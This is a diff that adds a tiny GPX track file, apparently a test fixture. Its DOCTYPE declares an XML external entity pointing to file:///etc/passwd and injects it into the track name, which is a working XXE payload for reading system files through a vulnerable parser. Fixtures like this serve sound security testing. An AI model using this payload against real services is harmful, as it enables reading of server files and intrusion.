@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<gpx version="1.1"><trk><name>&xxe;</name><trkseg><trkpt lat="32.600000" lon="35.000000"/><trkpt lat="32.601000" lon="35.001000"/></trkseg></trk></gpx>
